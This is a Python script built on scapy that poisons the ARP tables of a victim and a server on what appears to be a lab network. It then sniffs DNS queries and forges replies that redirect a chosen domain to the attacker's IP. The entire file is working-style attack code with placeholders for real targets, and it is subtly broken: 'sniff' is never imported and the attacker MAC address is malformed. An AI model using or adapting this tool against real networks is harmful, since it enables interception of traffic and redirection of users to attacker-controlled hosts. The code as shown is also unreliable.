import netifaces
import time
from scapy.all import Ether, ARP, IP, UDP, DNS, DNSQR, DNSRR, get_if_hwaddr, sendp

def sendPoisonPacket(ipAttacker, macAttacker, ipTarget, macTarget, ipToSpoof, iface):
    # Build ARP Packet
    arp = Ether() / ARP()
    arp[Ether].src = macAttacker
    arp[ARP].hwsrc = macAttacker
    arp[ARP].psrc = ipToSpoof
    arp[ARP].hwdst = macTarget
    arp[ARP].pdst = ipTarget

    # Send ARP Packet
    sendp(arp, iface=iface)

def spoofDNS(pkt):
    if pkt.haslayer(DNSQR):
        # Check if it's a DNS query
        victim_domain = "example.com"  # Modify this with the target domain
        spoofed_ip = "192.168.56.103"  # Modify this with the IP to redirect

        # Check if the queried domain matches the victim domain
        if pkt[DNSQR].qname.decode() == victim_domain:
            # Build DNS response
            dns_response = Ether() / IP(dst=pkt[IP].src) / UDP(dport=pkt[UDP].sport, sport=53) / \
                           DNS(id=pkt[DNS].id, qr=1, aa=1, qdcount=1, ancount=1,
                               qd=DNSQR(qname=pkt[DNSQR].qname),
                               an=DNSRR(rrname=pkt[DNSQR].qname, rdata=spoofed_ip))

            # Send DNS response
            sendp(dns_response, iface=iface, verbose=0)

# Attacker machine
ipAttacker = "192.168.56.103"  # Modify this with the attacker machine IP address
macAttacker = "08:00:27:d0:4b"  # Modify this with the attacker machine MAC address

# Victim machine
ipVictim = "192.168.56.101"  # Modify this with the victim machine IP address
macVictim = "08:00:27:b7:c4:af"  # Modify this with the victim machine MAC address

# Server machine
ipServer = "192.168.56.102"  # Modify this with the server machine IP address
macServer = "08:00:27:cc:08:6f"  # Modify this with the server machine MAC address

# Find the interface name
interfaces = netifaces.interfaces()
iface = interfaces[0]  # Assumes the first interface is the correct one, you can modify this based on your setup

# Send ARP packets to poison victim's and server's ARP tables
sendPoisonPacket(ipAttacker, macAttacker, ipVictim, macVictim, ipServer, iface)
sendPoisonPacket(ipAttacker, macAttacker, ipServer, macServer, ipVictim, iface)

# Start DNS spoofing
print("Initialised DNS Poisoning...")
try:
    sniff(filter="udp port 53", prn=spoofDNS, iface=iface, store=0)
except KeyboardInterrupt:
    print("Stopped DNS Poisoning")
